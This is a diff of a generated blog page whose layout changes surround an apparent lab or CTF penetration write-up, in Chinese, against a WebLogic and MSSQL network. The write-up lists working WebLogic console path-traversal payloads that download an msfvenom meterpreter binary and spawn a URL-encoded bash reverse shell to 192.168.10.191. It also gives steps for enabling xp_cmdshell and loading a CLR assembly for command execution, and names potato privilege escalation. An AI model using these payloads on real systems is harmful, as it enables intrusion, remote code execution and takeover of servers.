@@ -9,98 +9,89 @@
         
         <link rel="shortcut icon" href="../../img/favicon.ico">
         <title>ISOON - hkk_blog</title>
-        <link href="../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../css/bootstrap.min.css" rel="stylesheet">
         <link href="../../css/font-awesome.min.css" rel="stylesheet">
         <link href="../../css/base.css" rel="stylesheet">
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
-        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
-        <!--[if lt IE 9]>
-            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
-            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
-        <![endif]-->
 
         <script src="../../js/jquery-1.10.2.min.js" defer></script>
-        <script src="../../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="../../js/bootstrap.min.js" defer></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
         <script>hljs.initHighlightingOnLoad();</script> 
     </head>
 
     <body>
-
-        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark">
             <div class="container">
-
-                <!-- Collapsed navigation -->
-                <div class="navbar-header">
-                    <!-- Expander button -->
-                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
-                        <span class="sr-only">Toggle navigation</span>
-                        <span class="icon-bar"></span>
-                        <span class="icon-bar"></span>
-                        <span class="icon-bar"></span>
-                    </button>
-                    <a class="navbar-brand" href="../..">hkk_blog</a>
-                </div>
+                <a class="navbar-brand" href="../..">hkk_blog</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
 
                 <!-- Expanded navigation -->
-                <div class="navbar-collapse collapse">
+                <div id="navbar-collapse" class="navbar-collapse collapse">
                         <!-- Main navigation -->
                         <ul class="nav navbar-nav">
-                            <li >
-                                <a href="../..">Welcome to hkkblog</a>
+                            <li class="navitem">
+                                <a href="../.." class="nav-link">Welcome to hkkblog</a>
                             </li>
                             <li class="dropdown active">
-                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">Articl <b class="caret"></b></a>
+                                <a href="#" class="nav-link dropdown-toggle" data-toggle="dropdown">Articl <b class="caret"></b></a>
                                 <ul class="dropdown-menu">
                                     
-<li >
-    <a href="../DASCTF/">DASCTF</a>
+<li>
+    <a href="../DASCTF/" class="dropdown-item">DASCTF</a>
 </li>
                                     
-<li >
-    <a href="../[HTB]DT/">[HTB]Docter</a>
+<li>
+    <a href="../VNctf2021wp/" class="dropdown-item">VNctf2021</a>
 </li>
                                     
-<li >
-    <a href="../[HTB]Laboratory/">[HTB]Laboratory</a>
+<li>
+    <a href="../%5BHTB%5DDT/" class="dropdown-item">[HTB]Docter</a>
 </li>
                                     
-<li >
-    <a href="../docker和phpstorm搭建php开发环境/">docker和phpstorm搭建php开发环境</a>
+<li>
+    <a href="../%5BHTB%5DLaboratory/" class="dropdown-item">[HTB]Laboratory</a>
 </li>
                                     
-<li class="active">
-    <a href="./">ISOON</a>
+<li>
+    <a href="../docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/" class="dropdown-item">docker和phpstorm搭建php开发环境</a>
 </li>
                                     
-<li >
-    <a href="../ssh隧道/">ssh隧道</a>
+<li>
+    <a href="./" class="dropdown-item active">ISOON</a>
 </li>
                                     
-<li >
-    <a href="../初探pickle反序列化/">初探pickle反序列化</a>
+<li>
+    <a href="../ssh%E9%9A%A7%E9%81%93/" class="dropdown-item">ssh隧道</a>
 </li>
                                     
-<li >
-    <a href="../发财writeup/">HXB writeup</a>
+<li>
+    <a href="../%E5%88%9D%E6%8E%A2pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="dropdown-item">初探pickle反序列化</a>
+</li>
+                                    
+<li>
+    <a href="../%E5%8F%91%E8%B4%A2writeup/" class="dropdown-item">HXB writeup</a>
 </li>
                                 </ul>
                             </li>
                         </ul>
 
-                    <ul class="nav navbar-nav navbar-right">
-                        <li>
-                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
+                    <ul class="nav navbar-nav ml-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
                                 <i class="fa fa-search"></i> Search
                             </a>
                         </li>
-                            <li >
-                                <a rel="next" href="../docker和phpstorm搭建php开发环境/">
+                            <li class="nav-item">
+                                <a rel="prev" href="../docker%E5%92%8Cphpstorm%E6%90%AD%E5%BB%BAphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/" class="nav-link">
                                     <i class="fa fa-arrow-left"></i> Previous
                                 </a>
                             </li>
-                            <li >
-                                <a rel="prev" href="../ssh隧道/">
+                            <li class="nav-item">
+                                <a rel="next" href="../ssh%E9%9A%A7%E9%81%93/" class="nav-link">
                                     Next <i class="fa fa-arrow-right"></i>
                                 </a>
                             </li>
@@ -110,14 +101,26 @@
         </div>
 
         <div class="container">
-                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
-    <ul class="nav bs-sidenav">
-        <li class="main active"><a href="#isoon">ISOON</a></li>
-            <li><a href="#_1">无回显</a></li>
-            <li><a href="#_2">有回显</a></li>
-    </ul>
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-level="1"><a href="#isoon" class="nav-link">ISOON</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
 </div></div>
-                <div class="col-md-9" role="main">
+                    <div class="col-md-9" role="main">
 
 <h1 id="isoon">ISOON</h1>
 <p>nmap扫描端口</p>
@@ -136,20 +139,16 @@
 <p>我们可以利用msf生成一个elf马</p>
 <pre><code>./msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.10.191 lport=5555 -f elf &gt; test.elf
 </code></pre>
-
 <pre><code>http://192.168.57.119:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec('wget http://192.168.10.192/test.elf');&quot;)
 </code></pre>
-
 <p>需要权限+X</p>
 <h3 id="_2">有回显</h3>
 <pre><code>http://192.168.57.119:7001/console/css/%25%32%65%25%32%65%25%32%66consolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getParameter(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd} : new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')&amp;cmd=whoami
 </code></pre>
-
 <p><img alt="image-20201210103713000" src="../../img/image-20201210103713000.png" /></p>
 <p>将payload编码一下，利用ssrf弹bash</p>
 <pre><code>http://192.168.57.119:7001/console/css/%2e%2e%2fconsolejndi.portal?test_handle=com.tangosol.coherence.mvel2.sh.ShellSession('weblogic.work.ExecuteThread currentThread = (weblogic.work.ExecuteThread)Thread.currentThread(); weblogic.work.WorkAdapter adapter = currentThread.getCurrentWork(); java.lang.reflect.Field field = adapter.getClass().getDeclaredField(&quot;connectionHandler&quot;);field.setAccessible(true);Object obj = field.get(adapter);weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl)obj.getClass().getMethod(&quot;getServletRequest&quot;).invoke(obj); String cmd = req.getParameter(&quot;cmd&quot;);String[] cmds = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;window&quot;) ? new String[]{&quot;cmd.exe&quot;, &quot;/c&quot;, cmd} : new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, cmd};if(cmd != null ){ String result = new java.util.Scanner(new java.lang.ProcessBuilder(cmds).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next(); weblogic.servlet.internal.ServletResponseImpl res = (weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(&quot;getResponse&quot;).invoke(req);res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));res.getServletOutputStream().flush();} currentThread.interrupt();')&amp;cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%30%2e%31%39%31%2f%34%34%34%34%20%30%3e%26%31%27
 </code></pre>
-
 <p>cmd是经过url编码的bash</p>
 <p><img alt="image-20201210103954589" src="../../img/image-20201210103954589.png" /></p>
 <p>拿到shell后我们要信息收集，在/home/weblogic/Oracle/Middleware/user_projects/domains/iSoonDomain/config/jdbc</p>
@@ -185,7 +184,6 @@ SRVPORT   1080             yes       The port to listen on</p>
 --关闭xp_cmdshell
 EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;
 </code></pre>
-
 <p>执行</p>
 <p><code>exec xp_cmdshell 'whoami'</code></p>
 <p><img alt="image-20201210110908057" src="../../img/image-20201210110908057.png" /></p>
@@ -231,15 +229,12 @@ public partial class StoredProcedures
     }
 };
 </code></pre>
-
 <p>windows  .net自带csc.exe，下面命令可以找到csc.exe路径</p>
 <pre><code>Get-ChildItem -Recurse &quot;C:\Windows\Microsoft.NET\&quot; -Filter &quot;csc.exe&quot; | Sort-Object fullname -Descending | Select-Object fullname -First 1 -ExpandProperty fullname
 </code></pre>
-
 <p>然后编译</p>
 <pre><code> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /target:library C:/Users/kai/Desktop/cmd_exec.cs
 </code></pre>
-
 <p>我们需要将dll文件转成hex才能使用,使用下方powershell脚本可以转</p>
 <pre><code>
 $assemblyFile = &quot;C:\Users\kai\Desktop\cmd_exec.dll&quot;
@@ -270,7 +265,6 @@ $stringBuilder.AppendLine(&quot; &quot;) | Out-Null
 
 $stringBuilder.ToString() -join &quot;&quot; | Out-File C:\Users\kai\Desktop\cmd_exec.txt
 </code></pre>
-
 <p>以sysadmin登录mssql执行</p>
 <pre><code>Sp_Configure 'clr enabled', 1
 RECONFIGURE
@@ -290,7 +284,6 @@ GO
 EXEC[dbo].[cmd_exec] 'whoami'
 GO
 </code></pre>
-
 <p>使用<code>cmd_exec 'whoami'</code>就可以执行命令</p>
 <p>但是此机器无外网 ，无法反弹webshell</p>
 <p>不过msf如果监听的是跳板机，那他会在跳板机开一个端口监听，直接反向链接（ps:u1s1王神真强</p>
@@ -299,6 +292,7 @@ GO
 <p>成功弹到shell</p>
 <p>whoami  /priv 发现有<code>SeImpersonatePrivilege</code>权限</p>
 <p>可以使用potato提权</p></div>
+            </div>
         </div>
 
         <footer class="col-md-12">
@@ -307,26 +301,26 @@ GO
         </footer>
         <script>
             var base_url = "../..",
-                shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
         </script>
         <script src="../../js/base.js" defer></script>
         <script src="../../search/main.js" defer></script>
 
-        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
-    <div class="modal-dialog">
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
         <div class="modal-content">
             <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
                 <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
-                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
             </div>
             <div class="modal-body">
                 <p>
                     From here you can search these documents. Enter
                     your search terms below.
                 </p>
-                <form role="form">
+                <form>
                     <div class="form-group">
-                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
                     </div>
                 </form>
                 <div id="mkdocs-search-results"></div>
@@ -335,12 +329,12 @@ GO
             </div>
         </div>
     </div>
-</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
     <div class="modal-dialog">
         <div class="modal-content">
             <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
                 <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
-                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
             </div>
             <div class="modal-body">
               <table class="table">
